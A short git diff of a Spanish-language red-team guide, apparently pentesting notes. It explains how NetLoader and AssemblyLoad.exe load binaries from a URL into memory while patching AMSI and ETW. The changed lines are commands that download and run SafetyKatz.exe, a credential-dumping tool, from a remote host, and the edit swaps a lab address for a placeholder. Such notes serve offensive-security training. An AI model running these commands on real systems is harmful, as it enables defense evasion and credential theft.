@@ -44,11 +44,11 @@ Podemos usar NetLoader ([https://github.com/Flangvik/NetLoader](https://github.c
 
 Se puede usar para cargar archivos binarios desde la ruta de archivo o URL y parchear AMSI y ETW mientras se ejecuta.
 
-`C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe`
+`C:\Loader.exe -path http://IP/SafetyKatz.exe`
 
 También tenemos AssemblyLoad.exe que se puede usar para cargar el Netloader en la memoria desde una URL que luego carga un binario
 
-`C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe`
+`C:\AssemblyLoad.exe http://IP/Loader.exe -path http://IP/SafetyKatz.exe`
 
 **Abusing Trusts for Microsoft Products**
 
